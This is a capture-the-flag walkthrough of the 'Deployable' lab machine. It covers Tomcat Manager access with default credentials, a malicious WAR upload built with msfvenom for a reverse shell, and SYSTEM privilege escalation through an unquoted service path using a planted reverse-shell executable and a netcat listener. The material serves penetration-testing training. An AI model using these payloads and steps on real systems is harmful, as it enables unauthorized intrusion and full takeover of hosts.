---
description: https://www.cyberseclabs.co.uk/labs/info/Deployable/
---

# Deployable

![](<../../../.gitbook/assets/image (496).png>)

## Nmap

```
sudo nmap 172.31.1.13 -p- -sS -sV

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
8080/tcp  open  http               Apache Tomcat/Coyote JSP engine 1.1
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## HTTPS

ON Port 8080 we have Apache Tomcat/7.0.88. With Tomcat you can access a file upload session under the 'Manager App' button on the right.

![http://172.31.1.13:8080/](<../../../.gitbook/assets/image (497) (1).png>)

You will be presented with Http-basic-auth request box. Entering invalid credentials defaults to the page below.

![http://172.31.1.13:8080/host-manager/html](<../../../.gitbook/assets/image (498).png>)

The above page provides default credentials for admin:s3cret

If we try reloading the 'Manager App' page again and entering the credentials we are able to login with the defaults.

![http://172.31.1.13:8080/manager/html](<../../../.gitbook/assets/image (500).png>)

## Initial Foothold

I have completed some Tomcat based boxes before and find they are usually susceptible to malicious WAR file uploads. Further down the page we can see an opportunity to upload a WAR file.

![](<../../../.gitbook/assets/image (501).png>)

msfvenom can be used to create malicious WAR files which essentially are Java based reverse shells that we can generate. I have linked an article below which goes over some ways to exploit a Tomcat server. I will be using the WAR backdoor method.

{% embed url="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/" %}

Run the following in a terminal.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

![](<../../../.gitbook/assets/image (502).png>)

After this has been generated we can upload the malicious file. We can now see the shell now appear in the application list.

![](<../../../.gitbook/assets/image (503).png>)

Clicking on the shell will execute the reverse shell we created. Ensure you have a netcat listener running to catch the shell.

Once we execute the shell we should connect.

![](<../../../.gitbook/assets/image (504).png>)

## Privilege Escalation

Using `whoami /priv` we can check our privileges:

![](<../../../.gitbook/assets/image (505).png>)

'SeImpersonatePrivilege' is interesting and can potentially lead to JuicyPotato attacks. This is somewhat expected as this privilege is often given to service accounts in which we are likely running as.

the `systeminfo` command reveals we are running on Windows Server 2012 R2 Datacenter which is usually vulnerable to JuicyPotato attacks.

![](<../../../.gitbook/assets/image (506).png>)

For now I will explore other attack vectors as I have covered this type of attack recently.

I next set up a SMB server on my attacking machine using Impacket's smbserver.py.

```
sudo python2 smbserver.py -smb2support Share /home/kali/scripts/windows/
```

![](<../../../.gitbook/assets/image (507).png>)

We now should be able to execute and download files easily from inside the shell on the Server. I started with by running winPEAS.exe to identify in points of escalation.

![](<../../../.gitbook/assets/image (508).png>)

After a while winPEAS.exe picks up that the Deploy service is which uses Deploy.exe in the following path at `C:\Program Files\Deploy Ready\Service Files\Deploy.exe` has no quotes and has spaces in the path

![](<../../../.gitbook/assets/image (509).png>)

I have linked below a really good Medium article that explains the vulnerability really well. I have also shown a small snippet from the Article.

{% embed url="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae" %}

![@SumitVerma101](<../../../.gitbook/assets/image (510).png>)

In this case I will create a reverse shell with `msfvenom` called `Service.exe` as this will be executed before the `Deploy.exe` file.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /home/kali/scripts/windows/Service.exe 
```

I can then copy this over to the destination folder using the SMB server I set up earlier.

![](<../../../.gitbook/assets/image (511).png>)

We can now set up a `netcat` listener on our attacking machine to the port of the `Service.exe` we created.

```
nc -lvp 4477
```

We need to then start the service for it to execute the Service.exe as System.

```
sc start Deploy
```

![](<../../../.gitbook/assets/image (512) (1).png>)

You should now have a shell as System.

![](<../../../.gitbook/assets/image (513).png>)
